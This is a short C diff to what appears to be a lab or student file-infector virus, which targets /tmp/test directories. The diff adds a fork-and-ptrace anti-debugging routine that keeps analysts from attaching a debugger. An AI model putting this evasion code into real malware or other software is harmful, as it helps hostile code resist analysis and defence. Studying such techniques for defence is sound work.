@@ -147,11 +147,30 @@ static int  infectBins(const char *dirname) {
   return (0);
 }
 
+static int  preventDebug(void) {
+  pid_t pid;
+
+  if ((pid = fork()) == -1)
+    return (-1);
+  if (pid != 0) {
+    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1 ||
+        waitpid(pid, 0, 0) == -1) {
+      kill(pid, SIGTERM);
+      return (-1);
+    }
+    exit(0);
+  } else {
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
+      exit(1);
+  }
+  return (0);
+}
+
 int   main(void) {
   size_t  i;
   char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};
 
-  if (ptrace(PT_TRACE_ME, 0, 0, 0) == -1)
+  if (preventDebug() == -1)
     return (-1);
   i = 0;
   while (infectDir[i] != NULL) {
